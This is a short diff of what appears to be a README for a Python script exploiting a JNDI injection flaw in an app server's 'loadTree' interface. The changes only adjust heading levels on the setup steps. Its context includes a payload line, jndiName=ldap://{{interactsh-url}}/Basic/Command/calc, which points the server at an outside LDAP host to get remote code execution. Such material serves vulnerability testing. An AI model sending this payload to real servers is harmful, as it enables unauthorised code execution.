@@ -28,13 +28,13 @@ http:
     jndiName=ldap://{{interactsh-url}}/Basic/Command/calc
     Due to improper permission checks on the app server, attackers can trigger JNDI injection via the "loadTree" interface to achieve RCE (requires lower JDK versions). Legacy vuln, patched in August. EAS is also affected with a different path.
 
-# 1. 克隆本项目仓库到本地
+### 1. 克隆本项目仓库到本地
     
     git clone [https://github.com/JY-666-YINZI/Python_loadTree_JNDI_script.git](https://github.com/JY-666-YINZI/Python_loadTree_JNDI_script.git)
-# 2. 切换进入到脚本所在的根目录下
+### 2. 切换进入到脚本所在的根目录下
 
     cd Python_loadTree_JNDI_script
-# 3. 安装脚本运行所必须的依赖库
+### 3. 安装脚本运行所必须的依赖库
     
     pip install requests
 
